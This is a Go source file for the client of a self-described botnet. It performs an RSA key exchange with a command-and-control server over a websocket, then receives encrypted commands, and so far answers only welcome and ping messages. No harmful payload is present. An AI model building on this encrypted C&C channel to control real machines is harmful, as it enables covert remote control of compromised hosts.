package bot

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"time"

	"github.com/gorilla/websocket"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
)

// Bot is the bot program controller
type Bot struct {
	masterAddr    string
	msgEncryptKey *rsa.PublicKey
	cmdDecryptKey *rsa.PrivateKey
	ccConnection  *websocket.Conn
}

// NewBot initializes a Bot to its cc server
func NewBot(masterAddr string) (*Bot, error) {
	botPrivKey, botPubKey, err := encryption.GenerateRSAKeyPair(4096)
	if err != nil {
		return nil, err
	}
	conn, ccServerPubKey, err := protocol.CCHandshake(masterAddr, string(botPubKey))
	if err != nil {
		return nil, fmt.Errorf("handshake with C&C server failed: %s", err)
	}
	return &Bot{
		masterAddr:    masterAddr,
		cmdDecryptKey: botPrivKey,
		msgEncryptKey: ccServerPubKey,
		ccConnection:  conn,
	}, nil
}

// Run runs the initialized bot process
func (b *Bot) Run() {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	for {
		log.Println("[bot] waiting for command and control...")
		msgType, encryptedMessage, err := b.ccConnection.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}
		// discard all non binary messages
		if msgType != 2 {
			continue
		}
		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, b.cmdDecryptKey)
		if err != nil {
			log.Printf("could not decrypt message from c&c server: %s", err)
			continue
		}
		var cmd protocol.Command
		if err = json.Unmarshal(jsonMsg, &cmd); err != nil {
			log.Printf("could not unmarshal message from c&c server: %s", err)
			continue
		}
		b.HandleCommandFromCC(&cmd)
	}
}

// HandleCommandFromCC handles a single command from the command and control server
func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
	switch c.Type {
	case protocol.CommandTypeWelcome:
		log.Printf("[cmd&ctrl] WELCOME!!! joined botnet at unix time: %d", time.Now().Unix())
		return nil
	case protocol.CommandTypePing:
		log.Printf("[cmd&ctrl] PING!!! pinged by master at %d. full command: %v", time.Now().Unix(), c)
		return b.SendMessageToCC(&protocol.Message{Type: protocol.MessageTypePong})
	default:
		log.Printf("received unknown event type at %d. full command: %v", time.Now().Unix(), c)
		return nil
	}
}

// SendMessageToCC encrypts and sends a message to the CC Server
func (b *Bot) SendMessageToCC(msg *protocol.Message) error {
	msgJSON, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("could not marshal message: %s", err)
	}
	msgEncr, err := encryption.EncryptMessage(msgJSON, b.msgEncryptKey)
	if err != nil {
		return fmt.Errorf("could not encrypt message: %s", err)
	}
	return b.ccConnection.WriteMessage(websocket.BinaryMessage, msgEncr)
}
